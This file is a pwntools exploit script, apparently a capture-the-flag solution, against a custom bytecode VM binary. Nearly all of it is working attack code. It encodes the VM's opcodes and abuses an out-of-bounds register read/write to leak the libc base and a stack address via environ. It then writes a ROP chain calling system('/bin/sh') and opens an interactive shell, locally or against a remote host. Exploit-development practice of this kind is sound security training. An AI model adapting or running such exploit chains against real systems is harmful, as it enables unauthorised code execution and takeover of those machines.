#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
brva 0x148E
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


OPCODES = {
    'EXIT': 0,
    'ADD': 1,
    'SUB': 2,
    'MUL': 3,
    'DIV': 4,
    'IMM': 5,
    'MOV': 6,
    'LDM': 7,
    'STM': 8,
}

def vmExit():
    return p8(OPCODES['EXIT'])

def add(reg1, reg2):
    return p8(OPCODES['ADD']) + p64(reg1) + p64(reg2)

def sub(reg1, reg2):
    return p8(OPCODES['SUB']) + p64(reg1) + p64(reg2)

def mul(reg1, reg2):
    return p8(OPCODES['MUL']) + p64(reg1) + p64(reg2)

def div(reg1, reg2):
    return p8(OPCODES['DIV']) + p64(reg1) + p64(reg2)

def imm(reg, val):
    return p8(OPCODES['IMM']) + p64(reg) + p64(val)

def mov(reg1, reg2, signed=False):
    pack = lambda x: p64(x, signed=signed)
    return p8(OPCODES['MOV']) + pack(reg1) + pack(reg2)

def ldm(reg, offset):
    return p8(OPCODES['LDM']) + p64(reg) + p64(offset)

def stm(offset, reg):
    return p8(OPCODES['STM']) + p64(offset) + p64(reg)


def solve():

    """
    Bug: OOB r/w
    - Get libc base
    - Get stack address
    - ROP
    """

    offset_libc_base = 0x4000
    environ = 0x2242d0
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = pop_rdi + 1
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    ropchain = [
        pop_rdi,
        sh,
        ret,
        system
    ]

    payload = b""
    
    # memory leak -> arb read
    payload += mov(0, -3, signed=True)
    payload += imm(1, offset_libc_base)
    payload += add(0, 1)
    payload += mov(1, 0)
    payload += imm(2, environ)
    payload += add(1, 2)
    payload += mov(-2, 1, signed=True)
    payload += ldm(3, 4)
    payload += imm(5, 0x160)
    payload += sub(3, 5)
    payload += mov(-2, 3, signed=True)

    # rip control -> arb write -> rop
    for idx, gadget in enumerate(ropchain):
        payload += imm(1, gadget)
        payload += add(0, 1)
        payload += imm(6, idx)
        payload += stm(6, 0)
        payload += sub(0, 1)
    
    payload += vmExit()

    io.sendlineafter(b":", str(len(payload)).encode())
    io.sendafter(b":", payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

